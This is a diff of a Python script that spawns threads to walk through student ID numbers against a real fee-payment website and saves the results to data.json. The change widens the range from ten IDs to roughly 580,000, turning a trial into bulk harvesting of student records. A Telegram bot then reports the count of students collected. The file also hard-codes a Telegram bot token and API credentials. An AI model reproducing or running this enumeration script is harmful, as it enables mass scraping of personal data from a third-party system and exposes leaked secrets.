@@ -68,7 +68,7 @@ lock = threading.Lock()
 
 def count():
     print(count, end="\r")
-
+print("Starting...")
 def do_task(admin):
     global count, lisk
     url = "https://feepay.narayanagroup.com/"
@@ -97,7 +97,7 @@ def do_task(admin):
 start = time.time()
 threads = []
 threading.Thread(target=count).start()
-for i in range(1600000, 1600010):
+for i in range(1600000, 2180000):
     thread = threading.Thread(target=do_task, args=(i,))
     thread.start()
     threads.append(thread)
@@ -113,7 +113,7 @@ with open('data.json', 'w') as outfile:
 import pyrogram
 import asyncio
 async def main():
-    time_taken = await convert_time(time.time() - start)
+    time_taken = await convert_time(round(time.time() - start))
     length = len(lisk)
     caption = f"Total Time Taken: `{time_taken}`\nTotal Students: `{length}`"
     bot = pyrogram.Client("my_account",bot_token="6135056131:AAGEo8Wrd2bTsKfLa1GHIZLmSWj6Tp2AMpk",api_id="1255820",api_hash="cdb18eb09e9caa9e7b3f5c62eb7e9685")
